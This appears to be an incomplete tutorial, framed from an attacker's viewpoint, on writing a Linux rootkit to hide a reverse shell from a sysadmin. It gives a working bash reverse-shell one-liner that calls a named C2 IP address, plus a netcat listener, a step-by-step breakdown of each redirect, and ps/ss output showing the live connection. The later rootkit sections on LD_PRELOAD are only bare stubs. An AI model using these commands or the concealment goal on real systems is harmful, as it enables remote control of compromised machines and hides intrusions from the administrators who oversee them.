# How to Write a Linux Rootkit

## 1. Prerequisites

### 1.1 Scenario

You are an attacker. You have pwned a system and established a reverse shell.

```
SETUP:
[PWNED-VM] ----reverse shell---> [C2-SERVER(35.196.145.50)]
```

#### 1.1.1 Reverse Shell

_Reverse Shell TLDR: Netcat opens a TCP socket, binds it to a port, and pipes all traffic directly between stdin/stdout/stderr and the socket_

> Note:
> 0 = stdin
> 1 = stdout
> 2 = stderr

- 1. Create a listener on C2-SERVER
  - `nc -l -p 7070`
    - `-l`: "listen" mode
    - `-p 7070`: binds TCP port 7070
- What this command does:
  - Netcat calls `socket(AF_INET, SOCK_STREAM, 0)`, `bind()` to `0.0.0.0:7070`, `listen()`, then `accept()` for the first inbound connection
  - Once a client connects, `nc` reads from it's stdin and writes to the socket, and vice versa
- 2. Create a reverse shell on PWNED_VM
  - `/bin/bash -i >& /dev/tcp/35.196.145.50/7070 0>&1`
    - `/bin/bash -i`: launch bash in interactive mode (bash expects a tty/interactive session with prompts, etc.)
    - `/dev/tcp/35.196.145.50/7070`: bash-specific feature; when a redirect targets `/dev/tcp/HOST/PORT`, bash itself opens a TCP socket to `HOST:PORT` and associates it with the file descriptor you're redirecting
    - `>&`: redirect both stdout and stderr to a file
      - semantically `n>&m` means make fd `n` refer to the same underlying object as fd `m`
      - `>`: redirect stdout (fd 1) to a file
    - `>& /dev/tcp...`: redirect both stdout and stderr from bash over the TCP connection
    - `0>&1`: takes fd 0 (stdin) and points it to same socket that fd 1 already points to
  - might have to wrap it in `bash -c`: `bash -c '/bin/bash -i >& /dev/tcp/35.196.145.50/7070 0>&1'`

### 1.2 Goals

When the sysadmin runs `ps -aux` and `ss -tulnp`, they should see not see any output related to the reverse shell

#### 1.2.1 Current Output

**`ps auxf`**

- `a`: show processes from all users that are attached to a terminal (not just your own)
- `u`: display output in user-oriented format (adds human-readable columns like `USER` (owner), `%CPU`, `%MEM`, etc.)
- `x`: include processes without a controlling terminal (TTY); daemons and background jobs ofen't don't have a TTY; without `x`, can miss background services, reverse shells detached from terminal
- `f`: show a process tree

```bash
# removed all irreleevant output
asritha@asritha:~$ ps auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         813  0.0  0.2   6968  4608 tty1     Ss   18:00   0:00 /bin/login -p --
asritha      946  0.0  0.2   8652  5504 tty1     S    18:00   0:00  \_ -bash
asritha     1628  0.0  0.1   7340  3456 tty1     S    23:24   0:00      \_ bash -c bash -i >& /dev/tcp/35.196.145.50/7070 0>&1
asritha     1629  0.0  0.2   8660  5376 tty1     S+   23:24   0:00          \_ bash -i
```

**ss -tnp**

- `-t`: TCP
- `-p`: show process info
- `-n`: don't resolve names (show raw IP/port)

```bash
asritha@asritha:~$ sudo ss -tnp
State        Recv-Q        Send-Q               Local Address:Port                  Peer Address:Port         Process
ESTAB        0             0                      10.37.1.134:22                       10.37.1.1:56341         users:(("sshd",pid=1733,fd=4),("sshd",pid=1635,fd=4))
ESTAB        0             0                      10.37.1.134:40430                35.196.145.50:7070          users:(("bash",pid=1629,fd=2),("bash",pid=1629,fd=1),("bash",pid=1629,fd=0))

```

#### 1.2.2 `ps`

`which ps`
`file ps`

- everything in Linux is a file

#### 1.2.3 `ss`

`which ss`
`file ss`

### 1.3 Prerequisite Knowledge

#### 1.3.1 Kernelspace vs Userspace

## 2. Userspace Rootkits

### 2.1 `LD_PRELOAD`

- `strace ps`, `strace ss`
- `ldd ps`
- hook write syscall?
